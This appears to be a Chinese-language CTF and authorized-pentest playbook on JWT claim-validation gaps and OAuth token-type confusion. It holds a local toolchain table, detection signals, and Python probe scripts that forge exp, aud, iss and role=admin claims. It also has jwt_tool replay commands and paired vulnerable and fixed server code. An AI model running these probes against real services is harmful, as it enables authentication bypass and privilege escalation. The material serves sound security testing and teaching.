# JWT Claim 验证缺失 & Token 混用

> **来源**：改编自 `LING71671/open-reverselab` 的 `kb/ctf-website/techniques/02-auth/jwt/06-claim-missing.md`（GPL-3.0）。原 frontmatter 的 `mcp_tools` 映射已剔除——本技能包未挂载 `run_ctf_tool` / `http_probe`，改用本地工具链。
> **授权范围**：仅限 CTF 靶场 / AWD 赛场 / 已签署授权的测试环境。任何真实第三方目标、真实凭据、真实支付/生产流量都禁止套用本文流程。
> **什么时候用**：命中「Claim / exp / aud / iss」这类信号时，把本文当打点清单读；命中即进「步骤」，命中不了就换主题。

## 适用信号

- Claim
- exp
- aud
- iss
- Token混用
- ID Token
- Access Token
- 权限绕过

## 前置

- 授权：目标在 scope 内（`case-init.ps1` 已 grant），测试时段与限速已约定。
- 工具定位走探测层，别猜路径：

```powershell
. 'C:\relab2\skillpack\skills\scripts\lib\Bootstrap.ps1'
$r = Resolve-ReverseToolSpec -Name '<toolid>'   # 例：sqlmap / httpx / ffuf / curl / python
& $r.Command <参数>                                # 永远用完整路径，不依赖 cwd
```

- Python 解释器用探测层的 `python`（本机逆向库集中在 `D:\EXE\python\python.exe`，`venv-re` 是空壳，别去那里找库）。
- 本文脚本默认只读、只打点；扩大范围前先回到 scope 确认。
- 本文涉及的工具与本机实际状态（探测层 `Resolve-ReverseToolSpec` 于 2026-10-10 实测）：

| 工具 | 本机状态 | 本机命令 / 替代方案 |
|---|---|---|
| `playwright` | ✅ 已验证 | `& (Resolve-ReverseToolSpec -Name 'playwright').Command ...` → `D:\Tools\Node\playwright.cmd` |
| `objection` | ✅ 已验证 | `& (Resolve-ReverseToolSpec -Name 'objection').Command ...` → `D:\EXE\python\Scripts\objection.exe` |
| `subfinder` | ✅ 已验证 | `& (Resolve-ReverseToolSpec -Name 'subfinder').Command ...` → `D:\Tools\subfinder\subfinder.exe` |
| `gobuster` | ✅ 已验证 | `& (Resolve-ReverseToolSpec -Name 'gobuster').Command ...` → `D:\Tools\gobuster\gobuster.exe` |
| `mitmdump` | ✅ 已验证 | `& (Resolve-ReverseToolSpec -Name 'mitmdump').Command ...` → `D:\EXE\python\Scripts\mitmdump.exe` |
| `binwalk` | ✅ 已验证 | `& (Resolve-ReverseToolSpec -Name 'binwalk').Command ...` → `C:\Users\toti\.cargo\bin\binwalk.exe` |
| `openssl` | ✅ 已验证 | `& (Resolve-ReverseToolSpec -Name 'openssl').Command ...` → `C:\Program Files\Git\usr\bin\openssl.exe` |
| `katana` | ✅ 已验证 | `& (Resolve-ReverseToolSpec -Name 'katana').Command ...` → `D:\Tools\katana\katana.exe` |
| `nuclei` | ✅ 已验证 | `& (Resolve-ReverseToolSpec -Name 'nuclei').Command ...` → `D:\Tools\nuclei\nuclei.exe` |
| `python` | ✅ 已验证 | `& (Resolve-ReverseToolSpec -Name 'python').Command ...` → `D:\EXE\python\python.exe` |
| `sqlmap` | ✅ 已验证 | `& (Resolve-ReverseToolSpec -Name 'sqlmap').Command ...` → `D:\Tools\sqlmap\sqlmap.py` |
| `tshark` | ✅ 已验证 | `& (Resolve-ReverseToolSpec -Name 'tshark').Command ...` → `D:\Tools\Wireshark\tshark.exe` |
| `frida` | ✅ 已验证 | `& (Resolve-ReverseToolSpec -Name 'frida').Command ...` → `D:\EXE\python\Scripts\frida.exe` |
| `httpx` | ✅ 已验证 | `& (Resolve-ReverseToolSpec -Name 'httpx').Command ...` → `D:\Tools\httpx\httpx.exe` |
| `naabu` | ✅ 已验证 | `& (Resolve-ReverseToolSpec -Name 'naabu').Command ...` → `D:\Tools\naabu\naabu.exe` |
| `curl` | ✅ 已验证 | `& (Resolve-ReverseToolSpec -Name 'curl').Command ...` → `C:\WINDOWS\system32\curl.exe` |
| `dnsx` | ✅ 已验证 | `& (Resolve-ReverseToolSpec -Name 'dnsx').Command ...` → `D:\Tools\dnsx\dnsx.exe` |
| `ffuf` | ✅ 已验证 | `& (Resolve-ReverseToolSpec -Name 'ffuf').Command ...` → `D:\Tools\ffuf\ffuf.exe` |
| `nmap` | ✅ 已验证 | `& (Resolve-ReverseToolSpec -Name 'nmap').Command ...` → `D:\Tools\nmap\nmap.exe` |
| `node` | ✅ 已验证 | `& (Resolve-ReverseToolSpec -Name 'node').Command ...` → `D:\Tools\Node\node.exe` |
| `adb` | ✅ 已验证 | `& (Resolve-ReverseToolSpec -Name 'adb').Command ...` → `D:\Tools\android\AndroidKiller_fix\bin\adb\adb.exe` |
| `git` | ✅ 已验证 | `& (Resolve-ReverseToolSpec -Name 'git').Command ...` → `C:\Program Files\Git\cmd\git.exe` |
| `interactsh-client` | 未安装 | OOB 通道需自备回显服务（授权环境内的 VPS + `python -m http.server`）；本机无此工具 |
| `nuclei-templates` | 随 nuclei 提供 | `nuclei -t <模板目录>`；模板需联网 `-update-templates` |

- 上表中标「未安装」的工具**不要照抄原库的裸命令**：`Get-Command` 查空就下结论是错的，
  但四级探测 `Available=False` 是结论——此时按替代方案手写脚本，或先装再跑。


## 步骤

1. **检测信号** — 修改被签名的 Payload → 若返回 200，签名未验证
2. **检测信号** — 过期的 Token 仍能使用 → exp 未验证
3. **检测信号** — 修改 `iss` 为其他域后仍能使用 → iss 未验证
4. **检测信号** — 从 OAuth 流程抓到的 ID Token 能调 API → typ/aud 未验证
5. **检测信号** — A 服务的 Token 能调 B 服务 → aud 未验证且不区分

## 判据

判据必须是外部可观测的（状态码、响应字段、差分、落盘文件），不是「命令有输出」。

- **输入信号** — 签名正确但修改 `exp/nbf/iss/aud/typ/scope/role` 后响应差异很大
- **输入信号** — ID Token、Access Token、Refresh Token 都是 JWT，且 API 只看 `sub/role`
- **输入信号** — 多服务共享同一签名 key，但 `aud`/`azp`/`client_id` 未严格区分
- **输入信号** — 登出、改密、禁用账号后旧 token 仍能访问接口
- **Evidence** — `claim_oracle_matrix.csv`: claim、原值、变体、签名方式、状态码、body hash、身份/权限字段。
- **Evidence** — `token_type_matrix.json`: id/access/refresh token 对不同接口的接受情况。
- **Evidence** — `revocation_replay.json`: 登出/改密/禁用前后的 token 重放结果、jti、exp、session 绑定情况。
- **Evidence** — 成功样本: 过期/跨 aud/跨 typ/改 role token 被业务接口接受，并产生权限、数据或 flag 差异。
- **Evidence** — 失败样本: 明确 `expired`, `invalid audience`, `invalid issuer`, `token type invalid`, `replay rejected`。
- **Evidence** — 下一跳: 如果 claim 变体必须重新签名，先走 `03-weak-key-bruteforce`、`02-algorithm-confusion` 或 `05-jku-x5u-abuse`。

## 坑

- 探针命令在**未本机验证**时不要当成既定事实跑；先用探测层确认 `Available=True`。
- 噪声排除：先固定 baseline（同 URL 同 token 跑 3 次），再只改一个变量做差分。
- 不要把「状态码 200」当命中——WAF/缓存/软 404 都返回 200，命中判据要落到具体业务字段。

## 相关

- 见本技能 `../../SKILL.md` 的 references 索引。

## 技术正文

> 以下为原库正文（保留全部技术细节与脚本），仅移除原 `MCP 工具映射` 章节并重写跨文档链接。

## 输入信号

- 签名正确但修改 `exp/nbf/iss/aud/typ/scope/role` 后响应差异很大
- ID Token、Access Token、Refresh Token 都是 JWT，且 API 只看 `sub/role`
- 多服务共享同一签名 key，但 `aud`/`azp`/`client_id` 未严格区分
- 登出、改密、禁用账号后旧 token 仍能访问接口

## 0. Claim oracle 矩阵

| Claim | 变体 | 命中样本 | 失败样本 |
|-------|------|----------|----------|
| `exp` | 过去时间/删除/超远未来 | 过期 token 仍 200 | `Token expired` |
| `nbf` | 未来时间/删除 | 未来 token 提前生效 | `not yet valid` |
| `iss` | 其他 issuer/删除 | 跨 IdP token 可用 | `invalid issuer` |
| `aud` | 其他服务/数组/删除 | A token 打 B API | `invalid audience` |
| `typ` | `id`, `access`, `refresh` | ID token 调 API | token type rejected |
| `scope/role` | `admin`, `*`, array | 权限提升 | 服务端查库覆盖 |
| `jti` | 重复/删除 | 无限重放 | replay rejected |

## 0.1 Token 混用状态机

```
login -> id_token
      -> access_token
      -> refresh_token

测试顺序:
1. id_token 打资源 API
2. access_token 打登录回调/绑定账号接口
3. refresh_token 打资源 API
4. A client 的 token 打 B client API
5. 登出后旧 access_token 重放
```

## 原理

JWT 的 Claim 字段构成信任边界，但服务端常只解析 Payload 做业务判断，忽略 Claim 的语义校验。同时，同一 SSO 体系下的不同 Token 类型（ID Token、Access Token、Refresh Token）若被混用，可导致权限绕过。

---

## 1. Claim 验证缺失

### Claim 边界矩阵

| Claim | 含义 | 缺失验证的后果 | 攻击方法 |
|-------|------|---------------|----------|
| `exp` | 过期时间 | 泄露的旧 Token 永久有效 | 设为 `9999999999` 或移除 |
| `nbf` | 生效时间 | 未来的 Token 被提前使用 | 设为 `0` 或移除 |
| `iss` | 签发者 | 接受其他 IdP 签发的 Token | 改为其他信任域 |
| `aud` | 接收者 | Service A 的 Token 用于 Service B | 改为目标服务的 audience |
| `sub` | 主体标识 | 权限判断完全依赖可伪造字段 | 改为管理员 ID |
| `jti` | Token 唯一 ID | 无法防止重放 | 相同 jti 多次使用 |
| `typ` | Token 类型 | ID Token 当 Access Token 用 | 见下文 Token 混用 |
| `iat` | 签发时间 | 一般不单独利用 | 配合其他 Claim |

### 1.1 Claim 差分执行器

```python
# jwt_claim_diff_runner.py — claim 变体与接口差分
import copy
import time

def claim_variants(payload):
    base = copy.deepcopy(payload)
    yield "exp_past", {**base, "exp": 1}
    yield "exp_future", {**base, "exp": 4102444800}
    yield "aud_other", {**base, "aud": "other-service"}
    yield "aud_array", {**base, "aud": [base.get("aud", "api"), "admin-api"]}
    yield "iss_other", {**base, "iss": "https://other-idp.example"}
    yield "typ_id", {**base, "typ": "id"}
    yield "scope_admin", {**base, "scope": "admin *"}
    yield "role_admin", {**base, "role": "admin", "isAdmin": True}

def run_matrix(sign_fn, send_fn, payload):
    rows = []
    for name, body in claim_variants(payload):
        token = sign_fn(body)
        t0 = time.time()
        res = send_fn(token)
        rows.append({"case": name, "elapsed": round(time.time() - t0, 3), **res})
    return rows
```

保存 `claim_diff_matrix.jsonl`：case、payload diff、接口、状态码、响应 hash、身份字段、权限字段、订单/flag/管理数据变化。过期仍可用转 token theft/replay；ID token 能调 API 转 OAuth/OIDC 链。

### 伪代码：漏洞逻辑

```python
# 漏洞 — 只解析 Payload，不做 Claim 验证
def handle_request(auth_header):
    token = auth_header.replace("Bearer ", "")
    payload = jwt.decode(token, options={"verify_signature": False})
    # BUG: 没有调用 jwt.decode(token, key, algorithms=[...],
    #       options={"verify_exp": True, "verify_aud": True, ...})

    user_id = payload.get("sub")
    role = payload.get("role", "user")

    if role == "admin":
        return get_admin_data()
    else:
        return get_user_data(user_id)
```

```python
# 正确 — 全部 Claim 验证
def handle_request(auth_header):
    token = auth_header.replace("Bearer ", "")
    try:
        payload = jwt.decode(
            token,
            key=public_key,
            algorithms=["RS256"],
            options={
                "verify_signature": True,
                "verify_exp": True,      # 验证过期
                "verify_nbf": True,      # 验证生效时间
                "verify_iss": True,      # 验证签发者
                "verify_aud": True,      # 验证接收者
            },
            issuer="https://auth.company.com",
            audience="api.company.com"
        )
    except jwt.ExpiredSignatureError:
        abort(401, "Token expired")
    except jwt.InvalidAudienceError:
        abort(401, "Invalid audience")
    except jwt.InvalidIssuerError:
        abort(401, "Invalid issuer")
    # ...
```

### 伪代码：逐 Claim 攻击探测

```python
# probe_claim_validation.py

def probe_claim_validation(target_url: str, original_token: str):
    """
    探测每个 Claim 是否被验证
    返回每个 Claim 的状态: verified / not_verified / unknown
    """
    header_b64, _, sig_b64 = original_token.split('.')
    payload = json.loads(base64url_decode(original_token.split('.')[1]))

    tests = []

    # 测试 1: exp — 过期 Token
    expired = payload.copy()
    expired['exp'] = 1000000000  # 2001 年
    tests.append(("exp (expired)", expired))

    # 测试 2: exp — 移除
    no_exp = payload.copy()
    no_exp.pop('exp', None)
    tests.append(("exp (removed)", no_exp))

    # 测试 3: nbf — 未来时间
    future_nbf = payload.copy()
    future_nbf['nbf'] = 9999999999  # 还没到
    tests.append(("nbf (future)", future_nbf))

    # 测试 4: iss — 不同签发者
    diff_iss = payload.copy()
    diff_iss['iss'] = "https://evil.com"
    tests.append(("iss (different)", diff_iss))

    # 测试 5: aud — 不同接收者
    diff_aud = payload.copy()
    diff_aud['aud'] = "other-service"
    tests.append(("aud (different)", diff_aud))

    # 测试 6: 全部移除
    minimal = {"sub": payload.get("sub"), "role": "admin"}
    tests.append(("minimal (role=admin)", minimal))

    results = {}
    for name, modified_payload in tests:
        token = re_sign_or_keep(header_b64, modified_payload,
                                 sig_b64, original_token)
        resp = requests.get(target_url,
            headers={"Authorization": f"Bearer {token}"})
        results[name] = {
            "status": resp.status_code,
            "vulnerable": resp.status_code not in (401, 403)
        }
    return results
```

---

## 2. Token 类型混用

### 核心概念

```
┌─────────────────────────────────────────────────────────────┐
│ OAuth 2.0 / OIDC 三种 Token                                  │
│                                                              │
│  ID Token (身份证明)                                          │
│    用途: 证明"我是谁"（给客户端看的）                          │
│    受众: 客户端 (client_id)                                   │
│    包含: sub, name, email, picture                           │
│    ❌ 不应该用于 API 授权                                     │
│                                                              │
│  Access Token (访问授权)                                      │
│    用途: 证明"我能访问什么资源"（给 API 看的）                  │
│    受众: 资源服务器                                            │
│    包含: sub, scope, permissions                             │
│    ✅ 用于 API 调用                                           │
│                                                              │
│  Refresh Token (刷新凭证)                                     │
│    用途: 获取新的 Access Token                                │
│    受众: 授权服务器                                            │
│    ❌ 不应该暴露给前端以外的服务                               │
├─────────────────────────────────────────────────────────────┤
│ 攻击: 用 ID Token 调用需要 Access Token 的 API                │
│                                                              │
│   如果 API 只检查 sub 和签名，不检查 aud 和 typ:               │
│   → ID Token 也能通过验证                                     │
│   → 可能绕过某些 scope 限制                                   │
└─────────────────────────────────────────────────────────────┘
```

### 伪代码：Token 混用攻击

```python
# attack_token_confusion.py

def test_token_confusion(target_api: str, id_token: str, access_token: str):
    """
    测试 Token 混用场景

    场景:
      1. ID Token → 调用 API（能否替代 Access Token）
      2. 低权限 Access Token → 调用高权限 API
      3. Service A Access Token → 调用 Service B API
      4. Refresh Token → 调用 API
    """

    # 测试 1: ID Token 当 Access Token 用
    resp = requests.get(target_api,
        headers={"Authorization": f"Bearer {id_token}"})
    if resp.status_code == 200:
        print("[!] ID Token accepted as Access Token!")

    # 测试 2: 修改 typ 字段
    # 如果 ID Token 的 Header 中 typ=JWT，尝试改为 typ=at+jwt
    # Access Token 规范 typ 应为 "at+jwt"
    header, payload, sig = decode_token(id_token)
    header['typ'] = 'at+jwt'
    modified = re_sign_or_keep(header, payload, sig, id_token)
    resp = requests.get(target_api,
        headers={"Authorization": f"Bearer {modified}"})

    # 测试 3: 跨服务 Token
    # 拿 Service A 的 Token 请求 Service B
    resp_b = requests.get("https://service-b.target.com/api/data",
        headers={"Authorization": f"Bearer {access_token_for_a}"})
    if resp_b.status_code == 200:
        print("[!] Cross-service token accepted! (aud not verified)")

    # 测试 4: Refresh Token 调 API
    resp = requests.get(target_api,
        headers={"Authorization": f"Bearer {refresh_token}"})
    if resp.status_code == 200:
        print("[!] Refresh Token accepted as Access Token!")
```

---

## 3. 权限 Claim 直接信任

### 漏洞场景

```python
# 漏洞 — 直接从 JWT 读权限，不查数据库
@app.route("/api/admin/users")
def admin_users():
    token = request.headers.get("Authorization").split()[1]
    payload = jwt.decode(token, key, algorithms=["HS256"])
    # BUG: 直接信任 JWT 中的 role 字段
    if payload.get("role") != "admin":
        abort(403)
    return get_all_users()
```

### 攻击

```python
# 如果能通过其他方式获得签名密钥（weak key / alg confusion），
# 直接伪造 role=admin 的 Payload
# 如果签名未验证，直接修改 Payload 中的 role
# 不需要翻数据库或提升数据库中的角色
```

---

## 检测信号

- 修改被签名的 Payload → 若返回 200，签名未验证
- 过期的 Token 仍能使用 → exp 未验证
- 修改 `iss` 为其他域后仍能使用 → iss 未验证
- 从 OAuth 流程抓到的 ID Token 能调 API → typ/aud 未验证
- A 服务的 Token 能调 B 服务 → aud 未验证且不区分

## 工具命令

```bash
# jwt_tool 修改 Payload 并重放
python3 jwt_tool.py <token> -I \
  -pc "exp" -pv "9999999999" \
  -pc "role" -pv "admin" \
  -pc "aud" -pv "other-service"

# 测试过期 Token
python3 jwt_tool.py <token> -I -pc "exp" -pv "1000000000"

# 测试未来 Token
python3 jwt_tool.py <token> -I -pc "nbf" -pv "9999999999"
```

## 工作流

捕获原始 Token → 解码 header/claims → 一次验证一个签名或校验假设 → 构造最小变体 → 访问同一权限 oracle → 对比身份/权限/Flag。

## Evidence

- `claim_oracle_matrix.csv`: claim、原值、变体、签名方式、状态码、body hash、身份/权限字段。
- `token_type_matrix.json`: id/access/refresh token 对不同接口的接受情况。
- `revocation_replay.json`: 登出/改密/禁用前后的 token 重放结果、jti、exp、session 绑定情况。
- 成功样本: 过期/跨 aud/跨 typ/改 role token 被业务接口接受，并产生权限、数据或 flag 差异。
- 失败样本: 明确 `expired`, `invalid audience`, `invalid issuer`, `token type invalid`, `replay rejected`。
- 下一跳: 如果 claim 变体必须重新签名，先走 `03-weak-key-bruteforce`、`02-algorithm-confusion` 或 `05-jku-x5u-abuse`。
